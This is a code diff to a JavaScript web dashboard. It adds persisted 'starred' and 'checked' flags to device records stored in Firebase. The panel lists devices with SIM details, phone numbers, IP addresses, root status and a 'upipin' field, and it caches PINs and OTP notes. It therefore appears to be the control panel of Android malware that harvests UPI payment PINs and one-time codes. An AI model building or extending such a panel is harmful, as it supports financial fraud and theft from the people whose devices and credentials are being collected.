@@ -1151,12 +1151,16 @@ function setSSort(s){
 }
 function toggleCheck(id,ev){
   if(ev)ev.stopPropagation();
-  if(_checkedDevs.has(id))_checkedDevs.delete(id);else _checkedDevs.add(id);
+  var now=!_checkedDevs.has(id);
+  if(now)_checkedDevs.add(id);else _checkedDevs.delete(id);
+  fbSet('clients/'+id+'/checked',now||null).catch(function(){});
   renderSB();
 }
 function toggleStar(id,ev){
   if(ev)ev.stopPropagation();
-  if(_starredDevs.has(id))_starredDevs.delete(id);else _starredDevs.add(id);
+  var now=!_starredDevs.has(id);
+  if(now)_starredDevs.add(id);else _starredDevs.delete(id);
+  fbSet('clients/'+id+'/starred',now||null).catch(function(){});
   _updateStarBtn();
   renderSB();
 }
@@ -1230,7 +1234,7 @@ function connect(){
   loadDevs();startDP();
 }
 function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
-function disconnect(){FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};amCache={};amAll=[];amFilt=[];amLoaded=false;amCount=0;nukeStop();stopMP();stopDP();stopAP();killObs();document.getElementById('panel').style.removeProperty('display');document.getElementById('setup').style.removeProperty('display');document.getElementById('msgNoDev').style.display='flex';document.getElementById('msgCont').style.display='none';}
+function disconnect(){FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};_starredDevs=new Set();_checkedDevs=new Set();amCache={};amAll=[];amFilt=[];amLoaded=false;amCount=0;nukeStop();stopMP();stopDP();stopAP();killObs();document.getElementById('panel').style.removeProperty('display');document.getElementById('setup').style.removeProperty('display');document.getElementById('msgNoDev').style.display='flex';document.getElementById('msgCont').style.display='none';}
 
 // ─── Pollers ──────────────────────────────────────────────────────────────
 function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{
@@ -1362,7 +1366,11 @@ async function loadDevs(){
   try{
     var data=await fbGet('clients');var primDevs=parseDevs(data);
     primDevs.forEach(function(d){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;});
-    primDevs.forEach(function(d){if(noteC[d.id]===undefined)noteC[d.id]=d.note||'';});
+    primDevs.forEach(function(d){
+      if(noteC[d.id]===undefined)noteC[d.id]=d.note||'';
+      if(d._starred)_starredDevs.add(d.id);
+      if(d._checked)_checkedDevs.add(d.id);
+    });
     // Primary is NEVER in fbInstances — just set allDevices directly then merge
     if(fbInstances.length>0){fbMergeAll();}else{allDevices=primDevs;renderStats();renderSB();renderOV();}
     requestIdleCallback(function(){preloadPins(allDevices);if(_apOn)_apLoop();},{timeout:500});
@@ -1384,7 +1392,7 @@ function parseDevs(data){
       var jTs=parseDT(d.joined||d.createdAt||d.timestamp||'')||0;
       var mob=fmtPh(d.mobNo||(sims[0]&&(sims[0].phoneNumber||'')||''));
       var upipin=(d.upipin&&String(d.upipin).trim())||null;
-      devs.push({id:id,fbKey:id,name:d.modelName||d.model||d.deviceName||id,batteryRaw:d.battery!=null?d.battery:'—',batteryNum:parseBatt(d.battery),status:!!d.status,mobNo:mob,ip:d.ip_address||'—',android:d.androidV||'—',storage:d.storage||'—',note:d.note||'',joined:d.joined||'—',jTs:jTs,sdkV:d.sdkV||'—',cpuArch:d.cpu_arch||'—',isRoot:!!d.isRoot,isSdCard:!!d.isSdCard,serviceProvider:d.service_provider||'',upipin:upipin,sims:sims});
+      devs.push({id:id,fbKey:id,name:d.modelName||d.model||d.deviceName||id,batteryRaw:d.battery!=null?d.battery:'—',batteryNum:parseBatt(d.battery),status:!!d.status,mobNo:mob,ip:d.ip_address||'—',android:d.androidV||'—',storage:d.storage||'—',note:d.note||'',joined:d.joined||'—',jTs:jTs,sdkV:d.sdkV||'—',cpuArch:d.cpu_arch||'—',isRoot:!!d.isRoot,isSdCard:!!d.isSdCard,serviceProvider:d.service_provider||'',upipin:upipin,sims:sims,_starred:!!d.starred,_checked:!!d.checked});
     });
   }
   devs.sort(function(a,b){if(a.status!==b.status)return b.status-a.status;if(a.jTs&&b.jTs)return b.jTs-a.jTs;return a.name.localeCompare(b.name);});
